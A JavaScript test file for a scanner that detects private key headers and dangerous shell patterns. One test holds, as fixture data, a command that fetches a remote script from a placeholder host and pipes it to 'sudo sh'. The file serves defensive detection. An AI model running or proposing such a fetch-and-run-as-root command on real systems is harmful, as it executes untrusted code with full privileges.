import { test } from "node:test";
import { strict as assert } from "node:assert";
import { evaluateAll, scan } from "./app.js";

test("recognizes encrypted PKCS8 and existing private key labels", () => {
  for (const label of ["PRIVATE KEY", "RSA PRIVATE KEY", "EC PRIVATE KEY", "OPENSSH PRIVATE KEY", "ENCRYPTED PRIVATE KEY"]) {
    assert.deepEqual(scan(`synthetic header fixture only\n-----BEGIN ${label}-----\nNOT-A-KEY\n`), [{ line: 2, kind: "private key" }]);
  }
});

test("does not flag public, certificate, incomplete or end headers", () => {
  assert.deepEqual(scan([
    "-----BEGIN PUBLIC KEY-----", "-----BEGIN RSA PUBLIC KEY-----",
    "-----BEGIN CERTIFICATE-----", "-----BEGIN ENCRYPTED PUBLIC KEY-----",
    "-----BEGIN ENCRYPTED PRIVATE KEY", "-----END ENCRYPTED PRIVATE KEY-----",
  ].join("\n")), []);
});

test("detects a private key", () => {
  const findings = scan("-----BEGIN PRIVATE KEY-----");
  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, "private key");
});

test("clean text has no findings", () => {
  assert.deepEqual(scan("plain text"), []);
});

test("dangerous shell pattern only flagged for shell-like files", () => {
  const line = "curl https://example.invalid/setup.sh | sudo sh";
  assert.equal(scan(line, false).length, 0);
  assert.equal(scan(line, true).length, 1);
});

test("evaluation is perfect on the bundled fixtures", () => {
  const result = evaluateAll();
  assert.equal(result.precision, 1);
  assert.equal(result.recall, 1);
});
